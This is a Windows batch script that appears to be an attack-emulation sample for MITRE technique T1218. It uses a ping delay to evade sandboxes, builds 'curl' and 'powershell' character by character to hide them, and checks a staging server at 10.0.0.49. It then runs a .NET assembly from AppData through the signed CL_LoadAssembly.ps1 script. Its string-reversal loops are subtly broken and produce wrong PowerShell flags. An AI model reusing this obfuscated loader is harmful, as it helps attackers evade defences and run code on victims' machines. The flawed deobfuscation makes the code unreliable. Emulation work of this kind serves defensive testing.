@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET txisnba=%APPDATA%\7654\51c4078a
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7654-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=project.txt
SET dvhhyc=7654

REM Initial sandbox evasion delay
ping -n 45 127.0.0.1 >nul

REM Character-by-character obfuscation for curl
SET rwk=c
SET rbm=u
SET jpo=r
SET tlp=l
SET cjz=.exe
SET curl=%rwk%%rbm%%jpo%%tlp%%cjz%

REM Check server availability (Step 0)
%curl% -k -s -o nul "!keghkgto!"
SET /A hbc=!ERRORLEVEL!
SET ckk=
SET blq=
IF !hbc! EQU 0 (
    SET ckk=1
    SET blq=
) ELSE (
    SET ckk=0
    SET blq=connection_failed
)

REM TTP Logging for T1218
SET wxk=!DATE:~-4!-!DATE:~4,2!-!DATE:~7,2!
SET umx=!TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~-3,3!
SET lqa=[!wxk! !umx!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed_Binary_Proxy_Execution=!ckk!:!blq!
ECHO !lqa! >> "%APPDATA%\!rrocubc!\macula-simulations.log" 2>nul

timeout /t 12 /nobreak >nul

REM Character encoding for LOLBIN parts
SET a1=p
SET a2=o
SET a3=w
SET a4=e
SET a5=r
SET a6=s
SET a7=h
SET a8=e
SET a9=l
SET a10=l
SET ps=%a1%%a2%%a3%%a4%%a5%%a6%%a7%%a8%%a9%%a10%.exe

REM Reverse string building for command parts
SET rev1= ssapyb-pe
SET rev2=dnammoc
SET cmd1=
FOR %%C IN (8 7 6 5 4 3 2 1) DO (
    SET rev1=!rev1:~1!
    IF NOT "!rev1:~0,1!"=="" SET cmd1=!rev1:~0,1!!cmd1!
)
SET cmd2=
FOR %%C IN (7 6 5 4 3 2 1) DO (
    SET rev2=!rev2:~1!
    IF NOT "!rev2:~0,1!"=="" SET cmd2=!rev2:~0,1!!cmd2!
)

REM Random delay
SET /A rndd=%RANDOM% %% 20 + 10
timeout /t !rndd! /nobreak >nul

REM Execute assembly via CL_LoadAssembly.ps1
%ps% !cmd1! !cmd2! "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath '!txisnba!\!xzanpex!';[Program]::Dale()"

CHOICE /C Y /N /D Y /T 15 >nul

ENDLOCAL